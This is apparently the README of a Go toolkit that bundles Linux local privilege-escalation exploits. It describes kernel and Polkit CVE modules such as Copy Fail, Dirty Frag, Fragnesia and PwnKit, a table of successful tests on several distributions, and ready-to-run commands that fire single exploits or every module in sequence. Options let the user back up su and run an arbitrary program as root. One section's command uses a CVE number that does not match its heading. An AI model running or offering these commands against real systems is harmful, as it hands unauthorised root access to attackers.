# RootHawkX
RootHawkX 是一个 Linux 本地安全测试终端工具，用 Go 编写，面向授权靶机、虚拟机和实验环境。

> 本项目基于 [RootHawk](https://github.com/RoadBicycle-C/RootHawk) 进行修改，集成了更多漏洞利用模块。

## 工具测试
| 序号 | 操作系统 | 测试漏洞 | 测试结果 | 说明 |
|---|---|---|---|---|
| 1 | AnolisOS | CVE-2026-31431 / Copy Fail | ✅ 成功 | 工具在该系统环境下测试通过 |
| 2 | openEuler | CVE-2026-31431 / Copy Fail | ✅ 成功 | 工具在该系统环境下测试通过 |
| 3 | 统信 UOS | CVE-2026-31431 / Copy Fail | ✅ 成功 | 工具在该系统环境下测试通过 |
| 4 | openKylin | CVE-2026-31431 / Copy Fail | ✅ 成功 | 工具在该系统环境下测试通过 |
| 5 | Ubuntu | CVE-2026-31431 / Copy Fail | ✅ 成功 | 工具在该系统环境下测试通过 |
| 6 | CentOS 7 | CVE-2021-4034 / PwnKit | ✅ 成功 | 工具在该系统环境下测试通过 |

### 信创系统openEuler
<img width="833" height="720" alt="image" src="https://github.com/user-attachments/assets/d78ddc6b-26e5-4026-90d0-b8e9ad69c654" />

### DirtyFrag
```bash
./RootHawkX-amd64 -e CVE-2026-43284
```
<img width="714" height="440" alt="image" src="https://github.com/user-attachments/assets/f4a5a64c-837d-4029-98d1-3797016a83c4" />

# CopyFail
```
./RootHawkX-amd64 -e CVE-2026-31431
```
<img width="734" height="513" alt="image" src="https://github.com/user-attachments/assets/3ae169cf-e605-4fc8-b493-5a4b68c87179" />

# CVE-2021-4034
```
./RootHawkX-amd64 -e CVE-2026-4034
```
<img width="601" height="240" alt="image" src="https://github.com/user-attachments/assets/923d18f2-1dda-4ee8-b402-3428a31e6bca" />

## 目录结构

```text
RootHawkX/
├── bin/
│   ├── RootHawkX-amd64
│   ├── RootHawkX-arm64
│   └── RootHawkX-386
├── pkg/
│   ├── exploits/
│   │   ├── cve20214034/
│   │   ├── cve20213560/
│   │   ├── cve20220847/
│   │   ├── cve202631431/
│   │   ├── cve202643284/
│   │   │   ├── exploit.go
│   │   │   └── exp.c
│   │   ├── cve202646300/
│   │   │   ├── exploit.go
│   │   │   └── fragnesia.c
│   │   ├── pintheft/
│   │   │   ├── exploit.go
│   │   │   └── pintheft.c
│   │   └── dirtydecrypt/
│   │       ├── exploit.go
│   │       └── dirtydecrypt.c
│   ├── logger/
│   ├── payloads/
│   ├── pipe/
│   ├── shell/
│   └── state/
├── roothawk.go
├── go.mod
├── go.sum
├── NOTICE.md
└── README.md
```

## 使用方法

查看帮助：

```bash
./RootHawkX-amd64 -help
```

查看模块列表：

```bash
./RootHawkX-amd64 -list
```

执行指定 CVE：

```bash
./RootHawkX-amd64 -e CVE-2022-0847
```

按顺序执行全部模块：

```bash
./RootHawkX-amd64 -any
```

## 参数说明

```text
-list              显示当前集成的 CVE 模块
-e <名称>          执行指定 CVE 或别名
-any               按列表顺序执行全部模块
-pk <路径>         指定 CVE-2021-4034 使用的 pkexec 路径，默认 /usr/bin/pkexec
-backup <路径>     CVE-2026-31431 执行前备份 su 到指定路径
-exec <路径>       CVE-2026-31431 提权后执行指定程序，而不是进入 su
-v                 尽量输出详细日志
-help              显示帮助
```

## 集成模块

| CVE 编号 | 常见名称/别名 | 漏洞类型/组件 |
| --- | --- | --- |
| CVE-2026-31431 | Copy Fail | Linux Kernel 本地提权，涉及 crypto / AF_ALG / algif_aead 相关逻辑问题。 |
| CVE-2026-43284 | Dirty Frag，也有人叫 CopyFail2 | Linux Kernel 本地提权，涉及 xfrm/esp、shared skb frags 等内核网络/数据包处理路径。 |
| CVE-2026-46300 | Fragnesia | Linux Kernel 本地提权，利用 XFRM ESP-in-TCP 子系统的逻辑bug，通过 page cache 覆写 /usr/bin/su 获取 root shell。 |
| pintheft | PinTheft | Linux Kernel 本地提权，利用 RDS zerocopy double-free + io_uring page cache overwrite，覆写 SUID 二进制页面缓存获取 root shell。 |
| dirtydecrypt | DirtyDecrypt / DirtyCBC | Linux Kernel 本地提权，利用 rxgk_decrypt_skb() 缺少 COW 保护导致 page cache 写入，覆写 SUID 二进制获取 root shell。 |
| CVE-2021-4034 | PwnKit | Polkit 的 pkexec 本地提权漏洞。 |
| CVE-2021-3560 | Polkit D-Bus 权限绕过 / Polkit Authentication Bypass | Polkit 本地提权，可通过 D-Bus 请求绕过凭据检查，提升权限；没有像 PwnKit 那样特别统一的短名字。 |
| CVE-2022-0847 | Dirty Pipe | Linux Kernel 本地提权，管道机制相关漏洞。 |

## 示例

```bash
./RootHawkX-amd64 -list
./RootHawkX-amd64 -e CVE-2021-4034
./RootHawkX-amd64 -e CVE-2021-4034 -pk /usr/bin/pkexec
./RootHawkX-amd64 -e CVE-2026-31431 -backup /tmp/su.bak
./RootHawkX-amd64 -e CVE-2026-31431 -backup /tmp/su.bak -exec /tmp/root-task
./RootHawkX-amd64 -e CVE-2026-43284 -v
./RootHawkX-amd64 -e CVE-2026-46300
./RootHawkX-amd64 -e fragnesia -v
./RootHawkX-amd64 -e pintheft
./RootHawkX-amd64 -e dirtydecrypt
./RootHawkX-amd64 -any
```

## 致谢

- [RootHawk](https://github.com/RoadBicycle-C/RootHawk) — 本项目基于的原项目，提供了基础框架和初始漏洞模块
- [v12-security/pocs](https://github.com/v12-security/pocs) — 提供了 Fragnesia、PinTheft、DirtyDecrypt 等漏洞利用 PoC
